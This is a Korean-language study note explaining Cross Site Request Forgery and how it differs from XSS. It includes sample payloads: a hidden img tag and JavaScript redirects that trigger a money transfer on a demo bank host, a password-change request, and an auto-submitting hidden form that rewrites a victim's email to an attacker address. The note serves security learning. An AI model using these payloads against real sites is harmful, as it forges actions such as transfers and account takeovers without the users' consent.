# Concept
교차 사이트 요청 위조(Cross Site Request Forgery, CSRF)
CSRF는 임의 이용자의 권한으로 임의 주소에 HTTP 요청을 보낼 수 있는 취약점

그럴듯한 웹 페이지를 만들어서 이용자의 입력을 유도하고, 
이용자가 값을 입력하면 이를 은행이나 중요 포털 사이트 등으로 전송하여 
마치 이용자가 동의한 것 같은 요청을 발생

CSRF 공격에 성공하기 위해서는 공격자가 작성한 악성 스크립트를 이용자가 실행해야함
공격자가 이용자에게 메일을 보내거나 게시판에 글을 작성해 
이용자가 이를 조회하도록 유도하는 방법이 있음

주로 이미지를 불러오는 img 태그를 사용하거나 
웹 페이지에 입력된 양식을 전송하는 form 태그를 사용함


---
# Example1
- HTML img 태그 공격 코드 예시
```html
<img src='http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337' width=0px height=0px>
```

- Javascript 공격 코드 예시
```js
/* 새 창 띄우기 */
window.open('http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337');
/* 현재 창 주소 옮기기 */
location.href = 'http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337';
location.replace('http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337');

<img src=`/changepw?userid=admin&userpw=a` width=0px height=0px>
```


# Example2
- OWASP에 있는 시나리오
- PHP에서 아래와 같은 폼 태그가 있다고 했을 때, `profile.php`에서 세션을 검사하더라도 html을 작성할 수 있는 포인트가 있으면 사용자 의도와 관계없이 변조된 요청을 보낼 수 있게 됨

```php
<form action="/url/profile.php" method="post">  
<input type="text" name="firstname"/>  
<input type="text" name="lastname"/>  
<br/>  
<input type="text" name="email"/>  
<input type="submit" name="submit" value="Update"/>  
</form>
```

```php
<SCRIPT>  
function SendAttack () {

form.email = "attacker@example.com";  
_// send to profile.php_  
form.submit();

}  
</SCRIPT>  
  
<BODY onload="javascript:SendAttack();">  
  
<form action="http://victim.example.com/profile.php" id="form" method="post">  
<input type="hidden" name="firstname" value="Funny">  
<input type="hidden" name="lastname" value="Joke">  
<br/>  
<input type="hidden" name="email">  
</form>
```

---




# Difference between XSS and CSRF
두 개의 취약점은 공격에 있어 서로 다른 목적을 가짐

XSS는 인증 정보인 세션 및 쿠키 탈취를 목적으로 하는 공격
공격할 사이트의 오리진에서 스크립트를 실행시킴

CSRF는 이용자가 임의 페이지에 HTTP 요청을 보내는 것을 목적으로 하는 공격
공격자는 악성 스크립트가 포함된 페이지에 접근한 이용자의 권한으로 웹 서비스의 임의 기능을 실행할 수 있음


# Reference
[OWASP](!https://cwe.mitre.org/data/definitions/352.html)

